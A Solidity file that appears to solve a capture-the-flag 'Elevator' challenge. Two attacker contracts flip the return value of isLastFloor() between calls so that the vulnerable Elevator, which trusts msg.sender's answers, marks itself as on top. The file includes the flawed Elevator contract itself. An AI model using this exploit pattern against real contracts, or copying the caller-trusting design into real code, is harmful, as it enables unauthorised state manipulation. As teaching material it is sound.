// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IElevator {
    function goTo(uint256) external;
    function top() external view returns (bool);
}

// one way
contract Hack {
    IElevator private immutable target; //  more abstract and decoupled design
    uint256 count;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function pwn() external {
        target.goTo(1);
        require(target.top(), "not top");
    }

    function isLastFloor(uint256) external returns (bool) { // has to implement isLastFloor()
        count++;
        return count > 1; // return false 1st time then return true 2nd time
    }
}

interface Building {
  function isLastFloor(uint) external returns (bool);
}


// another way
contract MaliciousBuilding is Building {
    Elevator public elevator; // directly using the Elevator contract type (less flexible)
    bool public toggle;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
        toggle = true;
    }

    function isLastFloor(uint) external override returns (bool) { // has to implement isLastFloor()
        toggle = !toggle; 
        return toggle; // return false 1st time then return true 2nd time
    }

    function attack() public {
        elevator.goTo(1);
    }
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    // This means the Elevator contract expects the caller (msg.sender) to be a contract that implements the Building interface.
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}